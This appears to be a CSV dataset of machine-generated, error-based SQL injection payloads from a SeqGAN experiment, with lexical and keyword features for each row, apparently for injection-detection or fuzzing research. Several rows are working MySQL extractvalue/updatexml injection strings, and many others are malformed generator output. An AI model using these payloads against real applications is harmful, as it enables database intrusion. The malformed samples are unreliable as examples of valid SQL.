label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eipk'  =  'j",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,452,159.0,33.0,3.901070501461867,45.0,35.0,57.0,22.0,0.2830188679245283,0.22012578616352202,0.3584905660377358,0.13836477987421383,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,1.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1% or or updatexml  (  (  (  (  (  0x2e,(  (  3393,8083  (  (  (  1808,concat  (  (  (  0x5c,0x7171706a71extractvalue  (  extractvalue  (  (  (  (  (  9627,md5  =  (  (  3393,1   then 4774 else cast  (  (  (  benchmarkd5 0 ual  )  e  (  elt  (  1759  =  (  3393,md5  (  0x5c,0x7171706a71,  (  select   (  el  (  e(  7982  =  (  3393,1   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,453,338.0,34.0,3.8459322473040403,95.0,73.0,121.0,49.0,0.28106508875739644,0.21597633136094674,0.35798816568047337,0.14497041420118342,0.0,0.0,0.0,0.0,0.0,3.0,0.0,35.0,1.0,0.0,10.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ' bnU1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'egkucusengmed5  (  (  18080x7171706a71,m5  (  (  t  (  (  (  0x52515a50   (  extractvalue  (  3393,1   )    )  extractvalue  (  (  benchmark  (  (  a  =  utelt  (  elt  (  1297  =  (  3393,1   )    uUSEROM  )  =  updatexml  (  (  lo_ anal  )  7982  =  3393,  (  select   (  elt  2917  =  (  3393,1",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,454,598.0,43.0,4.0153540012673,183.0,118.0,221.0,76.0,0.3060200668896321,0.19732441471571907,0.3695652173913043,0.12709030100334448,4.0,0.0,0.0,0.0,0.0,6.0,0.0,48.0,2.0,1.0,15.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%""   )    )     (  extractvalue  (  (  7982,concat  (  (  (  3393  (  (  (  (  (  (  =  (  extractvalue  (  (  (  benchmark  (   (  (  6200  )   (  6166  (  (  (  1297  =  (  0x2e,0x7171706a71,  (  5000000,md5  (  7982  =  (  3393,  (  (  benchmark  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  (  (  5000000,md5    ( (  0x5c,m",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,455,368.0,32.0,3.635002631508733,87.0,75.0,145.0,61.0,0.23641304347826086,0.20380434782608695,0.39402173913043476,0.16576086956521738,0.0,1.0,0.0,0.0,0.0,3.0,0.0,46.0,1.0,0.0,10.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ''  =  'xw'  =  'knh' like '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,456,173.0,31.0,3.8735929566586007,45.0,39.0,61.0,28.0,0.26011560693641617,0.2254335260115607,0.35260115606936415,0.16184971098265896,8.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,1.0,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,457,164.0,27.0,3.6600619679006208,36.0,39.0,63.0,26.0,0.21951219512195122,0.23780487804878048,0.38414634146341464,0.15853658536585366,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    (  extractvalue  (   (  ual  1808,1   )    )    AND int  select  (  case when   (  (  5000000(  (  3393,1   )    (  updatexml  (  (  (  9627,concat  (  (  (  benchmark  (  (  1808,1   (  case 0 from dual  )  el  )  el  )  )   or extractvalue  (  (  3393,concat  (  (  (  =  (  7982,1   )    (  extractvalue  (  9627,1   )    (  select   (  case ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,458,356.0,40.0,3.6789465462597524,117.0,42.0,149.0,48.0,0.32865168539325845,0.11797752808988764,0.41853932584269665,0.1348314606741573,0.0,1.0,0.0,0.0,0.0,1.0,0.0,38.0,1.0,0.0,7.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%""   )    (  extractvalue  (  (  (   (  ual  el  (  (  e  (  0x5c,0x7171706a71,  (  (  select   (  elt  elt)  7982  =  (  (  0x2e,0x7171706a71,  (  5000000(  3393  (  (  (  benchmark  (  (  (  0x52515a50   (  e  (  elt  (  3393  =  (  1808,concat  (  (  (  (  0x2e,(  (  (  0x5c,0x7171706a71,  (  (  9255,md5  (  3393,m5  (  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,459,342.0,33.0,3.5875757728372983,75.0,80.0,133.0,54.0,0.21929824561403508,0.23391812865497075,0.3888888888888889,0.15789473684210525,0.0,1.0,0.0,0.0,0.0,2.0,0.0,40.0,1.0,0.0,10.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,460,165.0,27.0,3.674404995396533,37.0,39.0,63.0,26.0,0.22424242424242424,0.23636363636363636,0.38181818181818183,0.15757575757575756,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,461,155.0,29.0,3.788524110900782,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,462,10.0,5.0,2.1219280948873624,0.0,1.0,4.0,5.0,0.0,0.1,0.4,0.5,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,463,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,464,154.0,27.0,3.7603303976738283,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,465,155.0,29.0,3.788524110900782,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1where% pkddulea  e  (  elt  (  elt  (  3393  =  (  (  0x5c,  (  (  (  select   (  case 0 0 from dual  )  )  )   end  (  9490  )  (   (  (  (   (  5198  (  (  case 0 from 0 from dual  )   end  (  =  (  el  utl  )  1808  =    (  (  (  0x5c,0x7171706a71,  (  select   (   (  2501  (  (  e  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,466,289.0,34.0,3.4416843371703485,78.0,39.0,131.0,41.0,0.2698961937716263,0.13494809688581316,0.4532871972318339,0.14186851211072665,0.0,0.0,0.0,0.0,0.0,3.0,0.0,34.0,1.0,0.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ' pnn",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,467,151.0,27.0,3.7941990758451665,40.0,39.0,52.0,20.0,0.26490066225165565,0.2582781456953642,0.3443708609271523,0.13245033112582782,2.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,1.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%',updatexml  (  9627,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  (  benchmark  (  benchmark(   (  6560  (  (  (  0x2e,0x7171706a71,  (  (  5000000,md50x7171706a71,  (  (  (  5000000,md(  (  (  0x5c,0x7171706a71,  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  e  (  0x5c,  (  benchmark  (  2917,concat  (  (  (  (  (  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,468,392.0,29.0,3.756174819083434,102.0,112.0,119.0,59.0,0.2602040816326531,0.2857142857142857,0.30357142857142855,0.15051020408163265,1.0,0.0,0.0,0.0,0.0,0.0,0.0,39.0,1.0,0.0,18.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,469,154.0,27.0,3.7603303976738283,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,470,154.0,27.0,3.7603303976738283,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1"" and extractvalue  (  (  (  (  (  (  (  (  (  1297,concat  (  (  =  (  (  (  (  0x52515a50   (  5423  (  )  1808  =    (  (  7982  =  (  (  3393  =  (  (  0x2e,1   )    (  extractvalue  (  (  7982,1   )    (  extractvalue  (  benchmark  (  (   from   (  5433  (  (  elt  (  5000000,md5  (  1049  (  0x5c,  (  benchmark  (  (  5000000,md5  (  select   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,471,354.0,33.0,3.530358693171556,86.0,63.0,150.0,55.0,0.24293785310734464,0.17796610169491525,0.423728813559322,0.1553672316384181,0.0,1.0,0.0,0.0,0.0,4.0,0.0,44.0,0.0,0.0,6.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'zyn      0x717a767a71,updatexml  (  (  (  (  5000000,(  (  (  0x5c,0x7171706a71(  (  (  (  5000000,m(  (  (  (  (  benchmark  (  (  (  5000000(  (   (  (  7982,  (  =  (  3393,concat  (  (  (  (  (  (  (  (  6581  =  ut  (  7982  =  (  (  0x2e,0x7171706a71,  (  select   (  elta  elt  (  e  7982  =  (  (  0x5c,  (  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,472,486.0,37.0,3.6250622033169453,103.0,111.0,192.0,80.0,0.21193415637860083,0.22839506172839505,0.3950617283950617,0.1646090534979424,2.0,2.0,0.0,0.0,0.0,6.0,0.0,54.0,2.0,0.0,14.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,473,160.0,31.0,3.801392949321126,52.0,24.0,60.0,24.0,0.325,0.15,0.375,0.15,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,3.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,474,154.0,28.0,3.732451790224562,39.0,35.0,57.0,23.0,0.2532467532467532,0.22727272727272727,0.37012987012987014,0.14935064935064934,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,475,165.0,28.0,3.661125294687482,40.0,35.0,65.0,25.0,0.24242424242424243,0.21212121212121213,0.3939393939393939,0.15151515151515152,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ysmw'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,476,157.0,29.0,3.8502116972119267,41.0,39.0,55.0,22.0,0.2611464968152866,0.2484076433121019,0.3503184713375796,0.14012738853503184,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'   ,updatexml  (  (  (  7050  (  (  (  7982,concat  (  =  (  (  (  (  (  (  0x5c,0x7171706a71,  (  (  5000000(  (  (  0x2e,0x7171706a71,  (  5000000(  (  (  3393  (  (  (  0x5c,  (  (  select   (  (  elt  (  5000000,md5  (  t  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  0x5c,  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  el",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,477,351.0,28.0,3.4103932618981405,61.0,105.0,125.0,60.0,0.1737891737891738,0.29914529914529914,0.3561253561253561,0.17094017094017094,1.0,0.0,0.0,0.0,0.0,1.0,0.0,42.0,1.0,0.0,15.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%"" and updatexml  (  (  (   (  (  6200  )   (  5423  =  (  9627,mduant  )  (  select   (  elt  (  elt  (  5000000,md5  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  =  (  (    (  9255,concat  (  0x2e,concat  (  (  (  7982  =  (  3393,  (  5000000(  (  0x5c,md5  (  (  0x2e,  (  1151  (  (  (  select   (  elt  (  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,478,337.0,30.0,3.6490248037243695,73.0,87.0,124.0,53.0,0.2166172106824926,0.258160237388724,0.36795252225519287,0.1572700296735905,0.0,1.0,0.0,0.0,0.0,3.0,0.0,36.0,1.0,0.0,12.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,479,155.0,27.0,3.7743681400244764,37.0,39.0,55.0,24.0,0.23870967741935484,0.25161290322580643,0.3548387096774194,0.15483870967741936,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
